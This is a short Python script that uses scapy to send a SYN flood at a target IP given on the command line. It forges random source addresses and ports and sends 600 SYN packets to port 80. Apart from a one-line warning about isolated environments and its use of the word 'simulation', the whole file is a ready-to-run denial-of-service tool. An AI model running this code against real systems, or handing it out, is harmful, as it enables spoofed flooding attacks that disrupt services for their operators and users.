from scapy.all import IP, TCP, send
import sys
import random

def syn_flood(target_ip, target_port, num_packets):
    """
    WARNING: Only use in isolated environments!
    """
    
    print(f"Starting SYN flood simulation")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Packets: {num_packets}")
    
    for i in range(num_packets):
        # Randomize source IP and port
        ip_segments = [str(random.randint(1, 254)) for segment in range(4)]
        src_ip = ".".join(ip_segments)
        src_port = random.randint(1024, 65535)
        
        # Create IP layer
        ip = IP(src=src_ip, dst=target_ip)
        
        # Create TCP SYN packet
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        
        # Send packet
        send(ip/tcp, verbose=0)
        
        if (i + 1) % 100 == 0:
            print(f"Sent {i + 1} packets")
    
    print(f"Attack simulation complete")

if __name__ == "__main__":
    
    if len(sys.argv) != 2:
        print("Usage: python SynFlood.py <IP>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = 80
    num_packets = 600
    
    syn_flood(target_ip, target_port, num_packets)